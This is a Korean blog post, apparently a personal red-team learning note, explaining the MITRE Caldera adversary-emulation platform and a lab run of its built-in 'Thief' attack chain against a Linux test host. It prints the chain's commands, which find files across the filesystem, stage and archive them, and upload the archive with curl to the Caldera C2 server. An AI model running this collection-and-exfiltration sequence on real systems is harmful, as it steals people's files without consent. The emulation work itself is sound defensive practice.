---
title: Usage of Caldera
author: Jeongwon
date: 2025-02-21 16:04:00 +0900
categories: [Career, RedTeam]
tags: [writing]
render_with_liquid: false
---
## Caldera

###### `REF` : [DOCS](https://caldera.readthedocs.io/en/latest/) | [YOUTUBE](https://www.youtube.com/playlist?list=PLF2bj1pw7-ZvLTjIwSaTXNLN2D2yx-wXH) | [BLOG](https://medium.com/@mitrecaldera/welcome-to-the-official-mitre-caldera-blog-page-f34c2cdfef09) | [WEB](https://caldera.mitre.org/)

---
## Overview

### Campaigns/Agents
Victim host를 생성하고 관리합니다.

### Campaigns/Abilities
Caldera Server가 Victim host에게 수행할 수 있는 공격 전술입니다.

### Campaigns/Adversaries
`Abilities`의 공격 전술을 Chaining할 수 있습니다.

### Campaigns/Operation
`Adversaries`의 Attack Chain을 Victim host에게 실행합니다.

---
## Attack Test

![image](assets/img/usage-of-caldera/agent_create.png)
- `Campaigns/Agents`에서 Victim host를 생성합니다.
    - 저는 Sandcat을 사용하였고, Linux 환경의 Victim host를 택하였습니다.
    - `app.contact.http`의 IP 자리에 Caldera server의 IP를 넣어줍니다.
    - 입력을 마친 후 하단 명령어를 Victim host의 Terminal에서 실행해줍니다.

![image](assets/img/usage-of-caldera/operation_exec.png)
- `Campaigns/Operation`에서 실행할 Attack Chain을 `Campaigns/Adversaries`에서 선택합니다.
    - 예시로 생성되어있던 `Thief`를 실행해 보았습니다.

![image](assets/img/usage-of-caldera/adversaries_thief.png)
- `Campaigns/Adversaries`의 `Thief` Attack Chain입니다.

```bash
# T1074.001 : Data Staged: Local Data Staging
mkdir -p staged && echo $PWD/staged

# T1005 : Data from Local System
# plugins.stockpile.app.parsers.basic
find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5

# T1074.001 : Data Staged: Local Data Staging
# plugins.stockpile.app.requirements.paw_provenance
cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}

# T1560.001 : Archive Collected Data: Archive via Utility
# plugins.stockpile.app.requirements.paw_provenance
tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz

# T1041 : Exfiltration Over C2 Channel
# plugins.stockpile.app.requirements.paw_provenance
curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
```

- 위와 같은 Chain이 Victim host를 대상으로 실행됩니다.
  - 각각의 Abilities에서 적용될 변수들은 `Configuration/Fact Sources`에서 확인할 수 있습니다.

```bash
mkdir -p staged && echo $PWD/staged
find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
cp /usr/lib/python3/dist-packages/mpl_toolkits/tests/baseline_images/test_axisartist_axislines/Subplot.png /home/biz-jeongwon/staged
cp /Docker/host/tile-icon.png /home/biz-jeongwon/staged
cp /Docker/host/tile-error.png /home/biz-jeongwon/staged
tar -P -zcf /home/biz-jeongwon/staged.tar.gz /home/biz-jeongwon/staged && echo /home/biz-jeongwon/staged.tar.gz
curl -F "data=@/home/biz-jeongwon/staged.tar.gz" --header "X-Request-ID: `hostname`-antixm" http://[Caldera Server IP]:8888/file/upload
```

- 실제 실행되는 Attack Chain의 Command line입니다.
  - Victim host에 staging directory를 생성하고, sensitive file을 해당 directory에 옮긴 후, 압축하여 C2 server(Caldera server)로 curl을 통해 보냅니다.

![image](assets/img/usage-of-caldera/exfill_file.png)
- `Configuration/Exfilled Files`에서 Victim host로부터 훔친 파일을 확인할 수 있습니다.
 


 






 




